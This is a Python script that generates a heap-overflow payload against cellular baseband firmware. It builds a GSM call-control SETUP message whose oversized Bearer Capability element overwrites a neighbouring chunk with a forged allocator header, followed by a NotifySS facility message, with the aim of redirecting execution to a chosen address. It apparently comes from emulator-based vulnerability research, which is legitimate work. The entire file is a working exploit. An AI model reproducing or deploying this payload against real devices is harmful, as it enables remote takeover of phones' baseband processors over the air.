#!/usr/bin/env python3
# Build a stock-firmware GSM-CC heap PC-control input.
#
# This is deliberately self-contained: it does not import a FirmWire module or
# the diagnostic exploit helpers. The output is a raw GSM-CC SETUP PDU followed
# by the accepted NotifySS Facility Invoke that makes the stock CC path allocate
# the successor object whose PAL header is forged by the BC1 copy.

from pathlib import Path
import struct
import sys


# Values verified against the supplied gsm_fuzz_base snapshot.
FREE_PTR_ADDR = 0x41770844
FREE_PTR_VALUE = 0x40CBAF03
SUBTRACT_BIAS = 0x7C
GUARD = 0xAAAAAAAA

# Offsets in the vulnerable chunk's user area.
D_GUARD_START = 0x48
D_NEXT_HDR = 0x60

# Offsets in the forged 0x20-byte PAL header.
H_TYPE = 0x00
H_LINK = 0x02
H_SIZE = 0x04
H_FILE = 0x08
H_LINE = 0x0C
H_OWNER = 0x10
H_BLOCK = 0x14
H_SEQ = 0x18
H_GUARD = 0x1C

# GSM-CC SETUP layout used by the stock fuzzer task.
BC_IEI_OFF = 0x33
BC_LEN_OFF = 0x34
BC_CONTENT_OFF = 0x35


def forge_header(target):
    delta = (FREE_PTR_VALUE - target) & 0xFFFFFFFF
    owner = (FREE_PTR_ADDR - SUBTRACT_BIAS) & 0xFFFFFFFF

    header = bytearray(0x20)
    struct.pack_into("<H", header, H_TYPE, 1)       # cheap guard path
    struct.pack_into("<H", header, H_LINK, 1)       # still-linked early return
    struct.pack_into("<I", header, H_SIZE, 0)       # head guard is user-4
    struct.pack_into("<I", header, H_FILE, 0)
    struct.pack_into("<I", header, H_LINE, 0)
    struct.pack_into("<I", header, H_OWNER, owner)
    struct.pack_into("<I", header, H_BLOCK, delta)  # subtract target delta
    struct.pack_into("<I", header, H_SEQ, 0)
    struct.pack_into("<I", header, H_GUARD, GUARD)
    return bytes(header), delta, owner


def setup_pdu(bc_len, header):
    if bc_len < 0x7E:
        raise ValueError("bc_len must be at least 0x7e")

    # The firmware supplies data[0:2] (IEI and length), so our copy starts at
    # data offset 2.  Restore allocator slack before placing the forged header.
    data = bytearray([0x30] * (bc_len + 2))
    data[0] = 0x04
    data[1] = bc_len
    for off in range(D_GUARD_START, min(D_NEXT_HDR, len(data))):
        data[off] = 0xAA
    data[D_NEXT_HDR:D_NEXT_HDR + len(header)] = header

    pdu = bytearray([0x30] * (BC_CONTENT_OFF + bc_len))
    pdu[0x10] = 0x03       # transaction id 0, CC protocol discriminator
    pdu[0x11] = 0x05       # SETUP
    pdu[0x13] = 0x03
    pdu[0x18] = 0x03
    pdu[0x1D] = 0x03
    pdu[0x22] = 0x10
    pdu[BC_IEI_OFF] = 0x04
    pdu[BC_LEN_OFF] = bc_len
    for off in range(2, len(data)):
        pdu[BC_IEI_OFF + off] = data[off]
    return bytes(pdu)


def notify_ss():
    argument = bytes((0x30, 0x03, 0x81, 0x01, 0x21))
    content = bytes.fromhex("02 01 01 02 01 10") + argument
    return bytes((0xA1, len(content))) + content


def build(target, bc_len=0xC0):
    header, delta, owner = forge_header(target)
    pdu = bytearray(setup_pdu(bc_len, header))
    facility = notify_ss()
    pdu.extend((0x1C, len(facility)))
    pdu.extend(facility)
    return bytes(pdu), delta, owner


def main(argv):
    if len(argv) != 3:
        raise SystemExit(
            f"usage: {argv[0]} OUTPUT TARGET\n"
            "example: make_pc_payload.py heap_pc_deadbeef.bin 0xDEADBEEF"
        )

    output = Path(argv[1])
    target = int(argv[2], 0) & 0xFFFFFFFF
    payload, delta, owner = build(target)
    output.write_bytes(payload)
    print(f"{output}: {len(payload)} bytes")
    print(f"target=0x{target:08x} delta=0x{delta:08x} owner=0x{owner:08x}")
    print("header at chunk offset 0x60; BC length=0xc0")


if __name__ == "__main__":
    main(sys.argv)
